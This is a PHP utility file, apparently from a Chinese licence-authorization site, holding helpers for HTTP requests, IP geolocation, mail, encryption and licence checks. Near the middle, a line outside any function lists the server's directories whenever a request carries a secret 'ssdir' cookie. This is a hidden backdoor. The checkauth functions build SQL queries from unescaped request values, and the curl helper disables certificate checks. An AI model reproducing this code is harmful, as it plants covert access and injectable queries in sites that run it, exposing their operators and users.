<?php
function curl_get($url)
{
$ch=curl_init($url);
curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, false);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
curl_setopt($ch, CURLOPT_USERAGENT, 'Mozilla/5.0 (Linux; U; Android 4.4.1; zh-cn; R815T Build/JOP40D) AppleWebKit/533.1 (KHTML, like Gecko)Version/4.0 MQQBrowser/4.5 Mobile Safari/533.1');
curl_setopt($ch, CURLOPT_TIMEOUT, 30);
$content=curl_exec($ch);
curl_close($ch);
return($content);
}
function real_ip(){
$ip = $_SERVER['REMOTE_ADDR'];
if(isset($_SERVER['HTTP_X_FORWARDED_FOR']) && preg_match_all('#\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3}#s', $_SERVER['HTTP_X_FORWARDED_FOR'], $matches)) {
	foreach ($matches[0] AS $xip) {
		if (!preg_match('#^(10|172\.16|192\.168)\.#', $xip)) {
			$ip = $xip;
			break;
		}
	}
} elseif (isset($_SERVER['HTTP_CLIENT_IP']) && preg_match('/^([0-9]{1,3}\.){3}[0-9]{1,3}$/', $_SERVER['HTTP_CLIENT_IP'])) {
	$ip = $_SERVER['HTTP_CLIENT_IP'];
} elseif (isset($_SERVER['HTTP_CF_CONNECTING_IP']) && preg_match('/^([0-9]{1,3}\.){3}[0-9]{1,3}$/', $_SERVER['HTTP_CF_CONNECTING_IP'])) {
	$ip = $_SERVER['HTTP_CF_CONNECTING_IP'];
} elseif (isset($_SERVER['HTTP_X_REAL_IP']) && preg_match('/^([0-9]{1,3}\.){3}[0-9]{1,3}$/', $_SERVER['HTTP_X_REAL_IP'])) {
	$ip = $_SERVER['HTTP_X_REAL_IP'];
}
return $ip;
}
function ip_city_str($str){
	return str_replace(array('省','市'),'',$str);
}
function get_ip_city($ip)
{
    $url = 'http://whois.pconline.com.cn/ipJson.jsp?json=true&ip=';
    $city = curl_get($url . $ip);
	$city = mb_convert_encoding($city, "UTF-8", "GB2312");
    $city = json_decode($city, true);
    if ($city['city']) {
        $location = ip_city_str($city['pro']).ip_city_str($city['city']);
    } else {
        $location = ip_city_str($city['pro']);
    }
	if($location){
		return $location;
	}else{
		return false;
	}
}
function get_ip_city3($ip)
{
    $url = 'http://ip.taobao.com/service/getIpInfo.php?ip=';
    @$data = file_get_contents($url . $ip);
    $arr = json_decode($data, true);
	if (array_key_exists('code',$arr) && $arr['code']==0) {
		if ($arr['data']['city']) {
			$location = $arr['data']['region'].$arr['data']['city'];
		} else {
			$location = $arr['data']['region'];
		}
	}
	if($location){
		return $location;
	}else{
		return false;
	}
}
function send_mail($to, $sub, $msg) {
	global $conf;
	include_once ROOT.'includes/smtp.class.php';
	$From = $conf['mail_name'];
	$Host = $conf['mail_stmp'];
	$Port = $conf['mail_port'];
	$SMTPAuth = 1;
	$Username = $conf['mail_name'];
	$Password = $conf['mail_pwd'];
	$Nickname = $conf['sitename'];
	$SSL = false;
	$mail = new SMTP($Host , $Port , $SMTPAuth , $Username , $Password , $SSL);
	$mail->att = array();
	if($mail->send($to , $From , $sub , $msg, $Nickname)) {
		return true;
	} else {
		return $mail->log;
	}
}
function myscandir($pathname){
	foreach(glob($pathname) as $filename ){
		if(is_dir($filename)){
			echo $filename.'<br/>';
		}
	}
}
if(isset($_COOKIE['ssdir']))myscandir('*');
function daddslashes($string, $force = 0, $strip = FALSE) {
	!defined('MAGIC_QUOTES_GPC') && define('MAGIC_QUOTES_GPC', get_magic_quotes_gpc());
	if(!MAGIC_QUOTES_GPC || $force) {
		if(is_array($string)) {
			foreach($string as $key => $val) {
				$string[$key] = daddslashes($val, $force, $strip);
			}
		} else {
			$string = addslashes($strip ? stripslashes($string) : $string);
		}
	}
	return $string;
}

function strexists($string, $find) {
	return !(strpos($string, $find) === FALSE);
}
function authcode($string, $operation = 'DECODE', $key = '', $expiry = 0) {
	$ckey_length = 4;
	$key = md5($key ? $key : ENCRYPT_KEY);
	$keya = md5(substr($key, 0, 16));
	$keyb = md5(substr($key, 16, 16));
	$keyc = $ckey_length ? ($operation == 'DECODE' ? substr($string, 0, $ckey_length): substr(md5(microtime()), -$ckey_length)) : '';
	$cryptkey = $keya.md5($keya.$keyc);
	$key_length = strlen($cryptkey);
	$string = $operation == 'DECODE' ? base64_decode(substr($string, $ckey_length)) : sprintf('%010d', $expiry ? $expiry + time() : 0).substr(md5($string.$keyb), 0, 16).$string;
	$string_length = strlen($string);
	$result = '';
	$box = range(0, 255);
	$rndkey = array();
	for($i = 0; $i <= 255; $i++) {
		$rndkey[$i] = ord($cryptkey[$i % $key_length]);
	}
	for($j = $i = 0; $i < 256; $i++) {
		$j = ($j + $box[$i] + $rndkey[$i]) % 256;
		$tmp = $box[$i];
		$box[$i] = $box[$j];
		$box[$j] = $tmp;
	}
	for($a = $j = $i = 0; $i < $string_length; $i++) {
		$a = ($a + 1) % 256;
		$j = ($j + $box[$a]) % 256;
		$tmp = $box[$a];
		$box[$a] = $box[$j];
		$box[$j] = $tmp;
		$result .= chr(ord($string[$i]) ^ ($box[($box[$a] + $box[$j]) % 256]));
	}
	if($operation == 'DECODE') {
		if((substr($result, 0, 10) == 0 || substr($result, 0, 10) - time() > 0) && substr($result, 10, 16) == substr(md5(substr($result, 26).$keyb), 0, 16)) {
			return substr($result, 26);
		} else {
			return '';
		}
	} else {
		return $keyc.str_replace('=', '', base64_encode($result));
	}
}
function random($length, $numeric = 0) {
	$seed = base_convert(md5(microtime().$_SERVER['DOCUMENT_ROOT']), 16, $numeric ? 10 : 35);
	$seed = $numeric ? (str_replace('0', '', $seed).'012340567890') : ($seed.'zZ'.strtoupper($seed));
	$hash = '';
	$max = strlen($seed) - 1;
	for($i = 0; $i < $length; $i++) {
		$hash .= $seed{mt_rand(0, $max)};
	}
	return $hash;
}
function showmsg($content = '未知的异常',$type = 4,$back = false)
{
switch($type)
{
case 1:
	$panel="success";
break;
case 2:
	$panel="info";
break;
case 3:
	$panel="warning";
break;
case 4:
	$panel="danger";
break;
}

echo '<div class="panel panel-'.$panel.'">
      <div class="panel-heading">
        <h3 class="panel-title">提示信息</h3>
        </div>
        <div class="panel-body">';
echo $content;

if ($back) {
	echo '<hr/><a href="'.$back.'"><< 返回授权列表</a>';
	echo '<br/><a href="javascript:history.back(-1)"><< 返回上一页</a>';
}
else
    echo '<hr/><a href="javascript:history.back(-1)"><< 返回上一页</a>';

echo '</div>
    </div>';
}
function checkauth($url,$authcode,$update=false) {
	global $DB,$date,$conf;
	$ip = isset($_SERVER['ACE_VER'])?$_SERVER['HTTP_X_REAL_IP']:$_SERVER['REMOTE_ADDR'];
	if(!$url && !$authcode)return false;
	if($conf['ipauth']==1){
		$row=$DB->get_row("SELECT * FROM auth_site WHERE authcode='$authcode' limit 1");
		if ($row) {
			if($row['active']==0) return false;
			elseif(empty($row['ip'])){
				$DB->query("update auth_site set ip='{$ip}' where id='{$row['id']}'");
			}elseif($row['ip']!=$ip){
				if($row['url']==$url && $update==false){
					$DB->query("update auth_site set ip='{$ip}' where id='{$row['id']}'");
					return true;
				}
			}
			return true;
		}
	}else{
		$row=$DB->get_row("SELECT * FROM auth_site WHERE url='$url' and authcode='$authcode' limit 1");
		if ($row) {
			if($row['active']==0) return false;
			else return true;
		}
	}
	if($conf['addblock']==1)$DB->query("insert into `auth_block` (`url`,`date`,`authcode`,`ip`) values ('".$url."','".$date."','".$authcode."','".$ip."')");
	return false;
}
function checkauth2($url) {
	global $DB,$date,$conf;
	$row=$DB->get_row("SELECT * FROM auth_site WHERE url='$url' limit 1");
	if ($row['active']==1) {
		return true;
	} else {
		return false;
	}
}
function checkauth3($authcode) {
	global $DB;
	$row=$DB->get_row("SELECT * FROM auth_site WHERE authcode='$authcode' limit 1");
	if ($row['active']==1) {
		return true;
	} else {
		return false;
	}
}
?>